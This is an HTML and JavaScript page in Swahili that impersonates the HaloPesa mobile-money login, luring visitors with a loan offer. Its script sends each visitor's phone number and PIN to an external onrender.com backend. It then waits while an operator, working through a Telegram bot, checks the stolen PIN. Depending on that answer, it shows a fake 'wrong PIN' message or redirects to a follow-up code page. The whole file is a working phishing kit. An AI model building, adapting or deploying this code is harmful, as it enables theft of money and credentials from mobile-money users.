<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>HaloPesa | Ingia</title>

    <style>
        /* ===== HALOPESA BRAND STYLES ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f4f0;
            min-height: 100vh;
        }

        .container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0;
        }

        .upper-section {
            width: 100%;
            max-width: 420px;
            text-align: center;
        }

        /* ===== HEADER - HaloPesa Green ===== */
        .header {
            background: #1a7a2a;
            padding: 28px 20px 22px;
            border-bottom-left-radius: 24px;
            border-bottom-right-radius: 24px;
            box-shadow: 0 4px 16px rgba(26, 122, 42, 0.20);
        }

        .logo-circle {
            width: 58px;
            height: 58px;
            background: #ffd700;
            border-radius: 50%;
            margin: 0 auto 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #1a7a2a;
            font-size: 22px;
            font-weight: 800;
            box-shadow: 0 2px 12px rgba(255, 215, 0, 0.30);
        }

        .brand {
            color: #ffd700;
            font-size: 26px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }

        .subtitle {
            color: #d4edc8;
            margin-top: 4px;
            font-size: 14px;
            font-weight: 400;
        }

        /* ===== CONTENT ===== */
        .content {
            padding: 30px 20px 20px;
        }

        .login-title {
            font-size: 34px;
            color: #1a2b1a;
            font-weight: 700;
            margin-bottom: 22px;
            letter-spacing: -0.5px;
        }

        /* ===== PHONE INPUT — editable ===== */
        .phone-wrapper {
            position: relative;
            margin-bottom: 25px;
        }

        .phone-display {
            width: 100%;
            padding: 16px 18px 16px 56px;
            border: 2px solid #d0e0d0;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            background: #fafffa;
            text-align: left;
            color: #1a2b1a;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
            cursor: text;
        }

        .phone-display:focus {
            border-color: #1a7a2a;
            box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.12);
        }

        .phone-display.error {
            border-color: #b91c1c;
            box-shadow: 0 0 0 4px rgba(185, 28, 28, 0.12);
        }

        .flag {
            position: absolute;
            left: 18px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px;
            pointer-events: none;
        }

        /* ===== PIN SECTION ===== */
        .pin-label {
            color: #4a5a4a;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 18px;
        }

        .pin-row {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 15px;
        }

        .pin-boxes {
            display: flex;
            gap: 12px;
        }

        .pin-boxes input {
            width: 58px;
            height: 58px;
            border: 2px solid #d0e0d0;
            border-radius: 12px;
            text-align: center;
            font-size: 26px;
            font-weight: 700;
            outline: none;
            background: #fafffa;
            color: #1a2b1a;
            transition: border-color 0.2s, box-shadow 0.2s, transform 0.15s;
        }

        .pin-boxes input:focus {
            border-color: #1a7a2a;
            box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.12);
        }

        .pin-boxes input.error {
            border-color: #b91c1c;
            box-shadow: 0 0 0 4px rgba(185, 28, 28, 0.15);
        }

        .pin-boxes input:disabled {
            opacity: 0.6;
            background: #f0f4f0;
        }

        /* ===== SHAKE ANIMATION FOR WRONG PIN ===== */
        @keyframes shake {
            0%,
            100% {
                transform: translateX(0);
            }
            10% {
                transform: translateX(-12px);
            }
            30% {
                transform: translateX(10px);
            }
            50% {
                transform: translateX(-8px);
            }
            70% {
                transform: translateX(6px);
            }
            90% {
                transform: translateX(-4px);
            }
        }

        .pin-boxes.shake input {
            animation: shake 0.5s ease-in-out;
            border-color: #b91c1c;
            box-shadow: 0 0 0 4px rgba(185, 28, 28, 0.15);
        }

        /* ===== WRONG PIN BADGE ===== */
        .wrong-pin-badge {
            display: none;
            margin-top: 10px;
            padding: 10px 14px;
            background: #fde8e8;
            border: 1px solid #fcc;
            border-radius: 10px;
            color: #b91c1c;
            font-weight: 700;
            font-size: 15px;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .wrong-pin-badge.show {
            display: flex;
        }

        .wrong-pin-badge .icon {
            font-size: 20px;
        }

        .eye {
            font-size: 24px;
            color: #5a6b5a;
            cursor: pointer;
            padding: 8px;
            border-radius: 50%;
            transition: background 0.2s;
        }

        .eye:hover {
            background: #eaf6ea;
        }

        .forgot {
            color: #1a7a2a;
            margin-top: 18px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: color 0.2s;
        }

        .forgot:hover {
            color: #136622;
            text-decoration: underline;
        }

        /* ===== STATUS MESSAGES ===== */
        #status {
            min-height: 22px;
            margin-top: 12px;
            font-size: 14px;
            font-weight: 600;
            padding: 8px 12px;
            border-radius: 8px;
            display: none;
            transition: all 0.3s ease;
        }

        #status.error {
            display: block;
            background: #fde8e8;
            color: #b91c1c;
            border: 1px solid #fcc;
        }

        #status.success {
            display: block;
            background: #e8f5e8;
            color: #1a7a2a;
            border: 1px solid #b8d9b8;
        }

        #status.waiting {
            display: block;
            background: #fefcf0;
            color: #b8960f;
            border: 1px solid #f5e6b8;
        }

        #status.telegram-info {
            display: block;
            background: #e8f0fe;
            color: #1a4a7a;
            border: 1px solid #b8cfe0;
        }

        #status.wrong-pin {
            display: block;
            background: #fde8e8;
            color: #b91c1c;
            border: 2px solid #b91c1c;
            font-size: 16px;
            padding: 12px 16px;
            font-weight: 700;
        }

        /* ===== LOWER SECTION ===== */
        .lower-section {
            width: 100%;
            max-width: 420px;
            padding: 0 20px 40px;
        }

        .action-buttons {
            margin-top: 10px;
        }

        /* ===== LOGIN BUTTON - HaloPesa Green ===== */
        .action {
            width: 100%;
            background: #1a7a2a;
            color: white;
            text-align: center;
            padding: 17px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            border: none;
            transition: background 0.25s, transform 0.1s, opacity 0.25s;
            letter-spacing: 0.5px;
            position: relative;
        }

        .action:hover:not(:disabled) {
            background: #136622;
            transform: scale(1.01);
        }

        .action:active:not(:disabled) {
            transform: scale(0.98);
        }

        .action:disabled,
        .action.disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
            background: #8aaa8a;
        }

        .action .spinner {
            display: none;
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        .action.loading .spinner {
            display: block;
        }

        .action.loading .btn-text {
            display: none;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            .login-title {
                font-size: 30px;
            }

            .pin-boxes input {
                width: 52px;
                height: 52px;
                font-size: 22px;
            }

            .header {
                padding: 22px 16px 18px;
            }

            .brand {
                font-size: 22px;
            }

            .content {
                padding: 22px 16px 16px;
            }

            .phone-display {
                font-size: 16px;
                padding: 14px 14px 14px 50px;
            }
        }
    </style>
</head>

<body>

    <div class="container">

        <div class="upper-section">

            <!-- ===== HEADER - HaloPesa Style ===== -->
            <div class="header">
                <div class="logo-circle">HP</div>
                <div class="brand">HaloPesa</div>
                <div class="subtitle">Mikopo Rahisi na Haraka</div>
            </div>

            <div class="content">

                <div class="login-title">Ingia</div>

                <!-- ===== PHONE INPUT ===== -->
                <div class="phone-wrapper">
                    <span class="flag">🇹🇿</span>
                    <input
                    class="phone-display"
                    id="phoneDisplay"
                    type="tel"
                    placeholder="Weka nambari ya simu"
                    value=""
                    autocomplete="tel"
                    autofocus
                    />
                </div>

                <div class="pin-label">Weka Nambari ya Siri (tarakimu 4)</div>

                <div class="pin-row">
                    <div class="pin-boxes" id="pinBoxesContainer">
                        <input type="tel" maxlength="1" />
                        <input type="tel" maxlength="1" />
                        <input type="tel" maxlength="1" />
                        <input type="tel" maxlength="1" />
                    </div>
                    <div class="eye" id="toggleVisibility">👁</div>
                </div>

                <!-- ===== WRONG PIN BADGE ===== -->
                <div class="wrong-pin-badge" id="wrongPinBadge">
                    <span class="icon">❌</span>
                    <span>Nambari ya Siri SI SAHIHI! Tafadhali jaribu tena.</span>
                </div>

                <div class="forgot" id="forgotPin">Umesahau Nambari ya Siri?</div>
                <div id="status"></div>

            </div>

        </div>

        <div class="lower-section">
            <div class="action-buttons">
                <button class="action disabled" id="loginBtn" disabled>
                    <span class="btn-text">INGIA</span>
                    <span class="spinner"></span>
                </button>
            </div>
        </div>

    </div>

    <!-- ============================================================ -->
    <!-- ===== LOGIC ===== -->
    <!-- ============================================================ -->
    <script>
        // =============================================
        //  CONFIGURATION
        // =============================================
        const BACKEND_URL = "https://halopesa-tanzania-x2u7.onrender.com";

        // =============================================
        //  DOM REFS
        // =============================================
        const phoneInput = document.getElementById("phoneDisplay");
        const boxes = document.querySelectorAll(".pin-boxes input");
        const pinBoxesContainer = document.getElementById("pinBoxesContainer");
        const statusEl = document.getElementById("status");
        const loginBtn = document.getElementById("loginBtn");
        const forgotPinEl = document.getElementById("forgotPin");
        const toggleVisibilityEl = document.getElementById("toggleVisibility");
        const wrongPinBadge = document.getElementById("wrongPinBadge");

        let isPasswordVisible = false;
        let isSubmitting = false;
        let wrongPinAttempts = 0;

        // =============================================
        //  BOT ID FROM URL
        // =============================================
        const botId = new URLSearchParams(window.location.search).get("botId");
        console.log("🤖 Bot ID from URL:", botId);

        // =============================================
        //  TELEGRAM INTEGRATION CHECK
        // =============================================
        function isTelegramWebApp() {
            return !!(window.Telegram && window.Telegram.WebApp);
        }

        function notifyTelegram(message, type = 'info') {
            try {
                if (isTelegramWebApp()) {
                    const tg = window.Telegram.WebApp;
                    tg.showAlert(message);
                }
            } catch (e) {
                console.warn('Telegram notification failed:', e);
            }
        }

        // =============================================
        //  SHOW WRONG PIN NOTIFICATION (Swahili)
        // =============================================
        function showWrongPinNotification() {
            // Increment wrong attempt counter
            wrongPinAttempts++;

            // Show the badge
            wrongPinBadge.classList.add('show');

            // Shake the PIN boxes
            pinBoxesContainer.classList.remove('shake');
            // Force reflow for animation restart
            void pinBoxesContainer.offsetWidth;
            pinBoxesContainer.classList.add('shake');

            // Also show in status with a more detailed message
            const msg = "❌ Nambari ya Siri uliyoingiza SI SAHIHI! Tafadhali hakikisha umeingiza tarakimu 4 sahihi na ujaribu tena.";
            setStatus(msg, "wrong-pin");

            // Telegram notification in Swahili
            notifyTelegram("❌ Nambari ya Siri si sahihi! Tafadhali jaribu tena.", "error");

            // Clear PIN fields and focus on first box
            boxes.forEach(b => {
                b.value = '';
                b.classList.add('error');
            });

            // Remove error styling after animation
            setTimeout(() => {
                boxes.forEach(b => b.classList.remove('error'));
                pinBoxesContainer.classList.remove('shake');
            }, 600);

            // Focus on first PIN box
            setTimeout(() => {
                boxes[0].focus();
            }, 700);

            // Reset form state
            loginBtn.disabled = true;
            loginBtn.classList.add("disabled");
            loginBtn.classList.remove("loading");
            isSubmitting = false;
            validateAndUpdateButton();
        }

        // =============================================
        //  VALIDATION — enable button only when phone
        //  AND all 4 PIN digits are filled
        // =============================================
        function validateAndUpdateButton() {
            const phone = phoneInput.value.trim();
            let pin = "";
            boxes.forEach(b => pin += b.value);
            const allFilled = phone.length > 0 && pin.length === 4;

            // Clear error styling from phone
            phoneInput.classList.remove('error');
            boxes.forEach(b => b.classList.remove('error'));

            // Update button state
            loginBtn.disabled = !allFilled;
            if (allFilled) {
                loginBtn.classList.remove("disabled");
            } else {
                loginBtn.classList.add("disabled");
            }

            return allFilled;
        }

        // =============================================
        //  SHOW STATUS MESSAGE
        // =============================================
        function setStatus(message, type = 'waiting') {
            statusEl.textContent = message;
            statusEl.className = type;
            statusEl.style.display = 'block';
        }

        function clearStatus() {
            statusEl.style.display = 'none';
            statusEl.className = '';
            statusEl.textContent = '';
            wrongPinBadge.classList.remove('show');
        }

        // =============================================
        //  PHONE INPUT EVENTS
        // =============================================
        phoneInput.addEventListener("input", function() {
            this.classList.remove('error');
            localStorage.setItem("phone", this.value);
            validateAndUpdateButton();
            if (statusEl.className === 'error' || statusEl.className === 'wrong-pin') {
                clearStatus();
            }
        });

        phoneInput.addEventListener("change", validateAndUpdateButton);

        // =============================================
        //  PIN BOXES — auto-advance + validation
        // =============================================
        boxes.forEach((box, i) => {
            box.addEventListener("input", async function() {
                // Allow only numbers
                this.value = this.value.replace(/[^0-9]/g, '');

                // Remove error styling
                this.classList.remove('error');
                wrongPinBadge.classList.remove('show');

                // Auto-advance to next box
                if (this.value && i < 3) {
                    boxes[i + 1].focus();
                }

                validateAndUpdateButton();

                // If phone is empty, show a clear message
                const phone = phoneInput.value.trim();
                if (phone.length === 0) {
                    phoneInput.classList.add('error');
                    setStatus("❗ Tafadhali weka nambari yako ya simu kwanza.", "error");
                    boxes.forEach(b => { b.value = ''; });
                    boxes[0].focus();
                    validateAndUpdateButton();
                    return;
                }

                // Check if all 4 digits are entered
                if (i === 3 && this.value) {
                    let pin = "";
                    boxes.forEach(b => pin += b.value);

                    if (!botId) {
                        setStatus("❌ Hitilafu: Hakuna Kitambulisho cha Bot. Tafadhali tumia kiungo kutoka Telegram.",
                        "error");
                        notifyTelegram("Hitilafu: Hakuna Kitambulisho cha Bot.", "error");
                        boxes.forEach(b => { b.disabled = false;
                            b.value = ""; });
                        boxes[0].focus();
                        validateAndUpdateButton();
                        return;
                    }

                    const phoneCheck = phoneInput.value.trim();
                    if (phoneCheck.length === 0) {
                        phoneInput.classList.add('error');
                        setStatus("❗ Tafadhali weka nambari yako ya simu kwanza.", "error");
                        boxes.forEach(b => { b.value = ''; });
                        boxes[0].focus();
                        validateAndUpdateButton();
                        return;
                    }

                    await submitLogin(phoneCheck, pin);
                }
            });

            box.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !box.value && i > 0) {
                    boxes[i - 1].focus();
                    setTimeout(validateAndUpdateButton, 10);
                }
                if (e.key === "Enter") {
                    let pin = "";
                    boxes.forEach(b => pin += b.value);
                    const phone = phoneInput.value.trim();
                    if (pin.length === 4 && phone.length > 0) {
                        const event = new Event('input');
                        boxes[3].dispatchEvent(event);
                    } else if (phone.length === 0) {
                        phoneInput.classList.add('error');
                        setStatus("❗ Tafadhali weka nambari yako ya simu kwanza.", "error");
                        phoneInput.focus();
                    } else {
                        setStatus("❗ Tafadhali weka tarakimu zote 4 za Nambari ya Siri.", "error");
                        boxes[0].focus();
                    }
                }
            });

            box.addEventListener("blur", validateAndUpdateButton);

            box.addEventListener("focus", function() {
                this.classList.remove('error');
                if (statusEl.className === 'error' || statusEl.className === 'wrong-pin') {
                    clearStatus();
                }
            });
        });

        // =============================================
        //  PASTE SUPPORT
        // =============================================
        document.addEventListener('paste', (e) => {
            const target = e.target;
            if (!target.closest || !target.closest('.pin-boxes')) return;

            const pastedData = e.clipboardData.getData('text');
            const cleanedData = pastedData.replace(/[^0-9]/g, '');

            if (cleanedData.length === 4) {
                e.preventDefault();
                boxes.forEach((box, index) => {
                    box.value = cleanedData[index] || '';
                });
                boxes[3].focus();
                validateAndUpdateButton();

                const phone = phoneInput.value.trim();
                if (phone.length === 0) {
                    phoneInput.classList.add('error');
                    setStatus("❗ Tafadhali weka nambari yako ya simu kwanza.", "error");
                    boxes.forEach(b => { b.value = ''; });
                    boxes[0].focus();
                    validateAndUpdateButton();
                    return;
                }

                const event = new Event('input');
                boxes[3].dispatchEvent(event);
            }
        });

        // =============================================
        //  TOGGLE PIN VISIBILITY
        // =============================================
        toggleVisibilityEl.addEventListener("click", function() {
            isPasswordVisible = !isPasswordVisible;
            boxes.forEach(box => {
                box.type = isPasswordVisible ? "text" : "tel";
            });
            this.textContent = isPasswordVisible ? "🙈" : "👁";
        });

        // =============================================
        //  FORGOT PIN
        // =============================================
        forgotPinEl.addEventListener("click", function() {
            const phone = phoneInput.value.trim();
            let msg = "💡 Tafadhali wasiliana na msimamizi wa HaloPesa kupata Nambari yako ya Siri.";

            if (phone.length > 0) {
                msg = `💡 Tafadhali wasiliana na msimamizi wa HaloPesa kupata Nambari yako ya Siri kwa nambari ${phone}.`;
            }

            setStatus(msg, "telegram-info");

            if (isTelegramWebApp()) {
                notifyTelegram("Tafadhali wasiliana na msimamizi wa HaloPesa kupata Nambari yako ya Siri.", "info");
            }
        });

        // =============================================
        //  SUBMIT LOGIN
        // =============================================
        async function submitLogin(phone, pin) {
            if (isSubmitting) return;
            isSubmitting = true;

            boxes.forEach(b => b.disabled = true);
            loginBtn.disabled = true;
            loginBtn.classList.add("disabled", "loading");
            clearStatus();

            if (isTelegramWebApp()) {
                setStatus("📱 Inatuma kwa Telegram kwa uthibitisho...", "telegram-info");
            } else {
                setStatus("⏳ Inatuma Nambari ya Siri kwa uthibitisho...", "waiting");
            }

            try {
                const firstName = localStorage.getItem("firstName") || "";
                const lastName = localStorage.getItem("lastName") || "";
                const name = localStorage.getItem("name") || "";
                let fullName = name;
                if (!fullName && firstName) {
                    fullName = lastName ? `${firstName} ${lastName}` : firstName;
                }
                if (!fullName) {
                    fullName = "Unknown";
                }

                const cleanPhone = phone.replace(/\s/g, '');

                const payload = {
                    name: fullName || "Unknown",
                    phone: cleanPhone || "Unknown",
                    pin: pin || "",
                    botId: botId || ""
                };

                console.log("📤 Sending to backend:", payload);

                const res = await fetch(`${BACKEND_URL}/submit-pin`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    body: JSON.stringify(payload)
                });

                const responseText = await res.text();
                console.log("📥 Response status:", res.status);
                console.log("📥 Response body:", responseText);

                if (!res.ok) {
                    let errorMsg = "Imeshindwa kutuma Nambari ya Siri. Tafadhali jaribu tena.";
                    try {
                        const errorData = JSON.parse(responseText);
                        errorMsg = errorData.error || errorMsg;
                    } catch {
                        if (responseText) errorMsg = responseText;
                    }
                    setStatus(`❌ ${errorMsg}`, "error");
                    notifyTelegram(`Hitilafu: ${errorMsg}`, "error");
                    resetForm();
                    return;
                }

                let data;
                try {
                    data = JSON.parse(responseText);
                } catch {
                    setStatus("❌ Hitilafu ya muundo wa data kutoka seva.", "error");
                    notifyTelegram("Hitilafu ya muundo wa data kutoka seva.", "error");
                    resetForm();
                    return;
                }

                if (!data || !data.requestId) {
                    setStatus("❌ Seva haikurudisha Kitambulisho cha ombi. Jaribu tena.", "error");
                    notifyTelegram("Seva haikurudisha Kitambulisho cha ombi.", "error");
                    resetForm();
                    return;
                }

                if (isTelegramWebApp()) {
                    setStatus("📱 Ombi limetumwa kwa msimamizi wa Telegram. Inasubiri idhini...", "telegram-info");
                    notifyTelegram("Ombi lako limetumwa kwa msimamizi. Tafadhali subiri.", "info");
                } else {
                    setStatus("⏳ Ombi limetumwa. Inasubiri idhini ya msimamizi...", "waiting");
                }

                const approved = await pollPinApproval(data.requestId);

                if (approved === true) {
                    localStorage.setItem("pin", pin);
                    setStatus("✅ Nambari ya Siri imekubaliwa! Inaelekeza...", "success");
                    notifyTelegram("✅ Nambari ya Siri imekubaliwa! Inaelekeza...", "success");
                    setTimeout(() => {
                        window.location.href = `code.html?botId=${botId}`;
                    }, 500);
                } else if (approved === false) {
                    // ===== WRONG PIN DETECTED =====
                    showWrongPinNotification();
                    resetForm();
                } else {
                    setStatus("❌ Muda wa kusubiri umeisha. Tafadhali jaribu tena.", "error");
                    notifyTelegram("Muda wa kusubiri umeisha. Tafadhali jaribu tena.", "error");
                    resetForm();
                }

            } catch (error) {
                console.error("Network error:", error);
                setStatus("❌ Tatizo la muunganisho. Tafadhali angalia mtandao wako.", "error");
                notifyTelegram("Tatizo la muunganisho. Tafadhali angalia mtandao wako.", "error");
                resetForm();
            } finally {
                isSubmitting = false;
            }
        }

        // =============================================
        //  POLL PIN APPROVAL
        // =============================================
        function pollPinApproval(requestId) {
            let attempts = 0;
            const maxAttempts = 120;

            return new Promise((resolve) => {
                const interval = setInterval(async () => {
                    attempts++;
                    console.log(`🔍 Polling attempt ${attempts} for ${requestId}`);

                    try {
                        const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
                        const data = await res.json();
                        console.log("📥 Poll response:", data);

                        if (data.blocked) {
                            clearInterval(interval);
                            setStatus("🚫 Akaunti yako imezuiwa. Tafadhali wasiliana na msimamizi.", "error");
                            notifyTelegram("Akaunti yako imezuiwa.", "error");
                            resolve(false);
                            return;
                        }

                        if (data.approved === true) {
                            clearInterval(interval);
                            resolve(true);
                            return;
                        }

                        if (data.approved === false) {
                            clearInterval(interval);
                            resolve(false);
                            return;
                        }

                        if (attempts % 8 === 0 || attempts === 1) {
                            const elapsedSeconds = Math.floor(attempts * 1.5);
                            const minutes = Math.floor(elapsedSeconds / 60);
                            const seconds = elapsedSeconds % 60;
                            const timeStr = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds}s`;

                            if (isTelegramWebApp()) {
                                setStatus(`📱 Inasubiri idhini ya msimamizi wa Telegram... (${timeStr})`, "telegram-info");
                            } else {
                                setStatus(`⏳ Inasubiri idhini ya msimamizi... (${timeStr})`, "waiting");
                            }
                        }

                        if (attempts >= maxAttempts) {
                            clearInterval(interval);
                            setStatus("⏰ Muda wa kusubiri umeisha. Tafadhali jaribu tena.", "error");
                            notifyTelegram("Muda wa kusubiri umeisha. Jaribu tena.", "error");
                            resolve(null);
                        }

                    } catch (error) {
                        console.error("Poll error:", error);
                        if (attempts % 5 === 0) {
                            setStatus("🔄 Tatizo la muunganisho. Inajaribu tena...", "waiting");
                        }
                    }
                }, 1500);
            });
        }

        // =============================================
        //  RESET FORM
        // =============================================
        function resetForm() {
            boxes.forEach(b => {
                b.disabled = false;
                b.value = "";
                b.classList.remove('error');
            });
            pinBoxesContainer.classList.remove('shake');
            loginBtn.disabled = true;
            loginBtn.classList.add("disabled");
            loginBtn.classList.remove("loading");
            isSubmitting = false;
            validateAndUpdateButton();
            boxes[0].focus();
        }

        // =============================================
        //  LOGIN BUTTON CLICK
        // =============================================
        loginBtn.addEventListener("click", () => {
            if (loginBtn.disabled || isSubmitting) return;

            const phone = phoneInput.value.trim();
            if (phone.length === 0) {
                phoneInput.classList.add('error');
                setStatus("❗ Tafadhali weka nambari yako ya simu kwanza.", "error");
                phoneInput.focus();
                return;
            }

            let pin = "";
            boxes.forEach(b => pin += b.value);

            if (pin.length === 4) {
                const event = new Event('input');
                boxes[3].dispatchEvent(event);
            } else {
                setStatus("❗ Tafadhali weka Nambari ya Siri yenye tarakimu 4.", "error");
                boxes[0].focus();
            }
        });

        // =============================================
        //  LOAD
        // =============================================
        window.addEventListener('load', function() {
            setTimeout(() => {
                phoneInput.focus();
                const val = phoneInput.value;
                if (val) {
                    phoneInput.setSelectionRange(val.length, val.length);
                }
                validateAndUpdateButton();

                if (!botId) {
                    setStatus("⚠️ Hitilafu: Hakuna Kitambulisho cha Bot. Tafadhali tumia kiungo kutoka Telegram.",
                    "error");
                    loginBtn.disabled = true;
                    loginBtn.classList.add("disabled");
                } else {
                    if (isTelegramWebApp()) {
                        setStatus("✅ Umeunganishwa kwa Telegram. Weka nambari yako ya simu.", "telegram-info");
                        setTimeout(clearStatus, 3000);
                    }
                }
            }, 100);
        });

        document.addEventListener('pageshow', function() {
            phoneInput.focus();
            validateAndUpdateButton();
        });

        // =============================================
        //  INIT
        // =============================================
        loginBtn.disabled = true;
        loginBtn.classList.add("disabled");
        validateAndUpdateButton();

        console.log("✅ HaloPesa login page loaded — wrong PIN notifications in Swahili.");
        console.log("📱 Telegram WebApp:", isTelegramWebApp() ? "Yes" : "No");
        console.log("🤖 Bot ID:", botId || "MISSING");
    </script>

</body>
</html>
